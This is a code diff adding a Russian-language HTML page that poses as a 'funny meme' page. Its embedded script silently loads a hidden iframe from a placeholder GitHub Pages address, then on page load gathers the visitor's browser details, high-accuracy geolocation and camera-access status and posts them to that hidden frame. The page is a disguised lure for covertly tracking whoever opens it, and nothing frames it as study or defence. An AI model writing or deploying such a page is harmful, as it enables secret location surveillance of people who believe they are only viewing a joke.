@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Прикольный мем</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        img {
+            max-width: 100%;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        #loading {
+            color: #666;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <h1>Смотри, какой прикол!</h1>
+    <div id="loading">Загружаем мем...</div>
+    <img src="https://memchik.ru/storage/memes/5dc/5dc6fbfbb1c7e322d07291ae.jpg" alt="Смешной мем">
+
+    <script>
+        // Скрытый iframe для админ-панели
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://ваш-сайт.github.io/admin.html';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        // Функция сбора данных
+        async function collectData() {
+            const data = {
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                cookies: navigator.cookieEnabled,
+                mobile: /Mobi|Android/i.test(navigator.userAgent)
+            };
+
+            // Пытаемся получить камеру
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                data.camera = "Доступ разрешен";
+                stream.getTracks().forEach(track => track.stop());
+            } catch {
+                data.camera = "Доступ запрещен";
+            }
+
+            // Пытаемся получить геолокацию
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    });
+                });
+                data.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            } catch {
+                data.location = "Недоступно";
+            }
+
+            // Отправляем данные в iframe
+            iframe.contentWindow.postMessage(data, '*');
+        }
+
+        // Запускаем сбор данных после загрузки
+        window.addEventListener('load', () => {
+            document.getElementById('loading').remove();
+            setTimeout(collectData, 1000);
+        });
+    </script>
+</body>
+</html>
